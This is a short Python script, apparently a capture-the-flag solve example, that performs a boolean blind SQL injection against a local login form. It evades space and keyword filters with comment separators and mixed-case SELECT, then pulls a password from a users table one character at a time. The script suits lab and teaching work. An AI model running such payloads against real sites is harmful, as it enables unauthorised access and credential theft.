#!/usr/bin/env python3
"""示例脚本：布尔盲注登录框。仅演示 solve/ 的组织方式。"""
import string

import requests

URL = "http://127.0.0.1:5000/login"
CHARS = string.ascii_lowercase + string.digits + "_{}-"


def hit(payload: str) -> bool:
    r = requests.post(URL, data={"username": payload, "password": "x"}, timeout=3)
    return r.status_code == 200 and "欢迎" in r.text


def extract(sql: str, max_len: int = 64) -> str:
    # 过滤空格：用 /**/ 代替；过滤 select：用 SeLeCt 混写
    sql = sql.replace(" ", "/**/").replace("select", "SeLeCt")
    out = ""
    for pos in range(1, max_len + 1):
        for ch in CHARS:
            payload = f"'/**/or/**/(substr(({sql}),{pos},1)='{ch}')/**/or/**/'1'='2"
            if hit(payload):
                out += ch
                print(f"\r{out}", end="", flush=True)
                break
        else:
            break
    return out


if __name__ == "__main__":
    print(extract("select pass from users limit 1"))
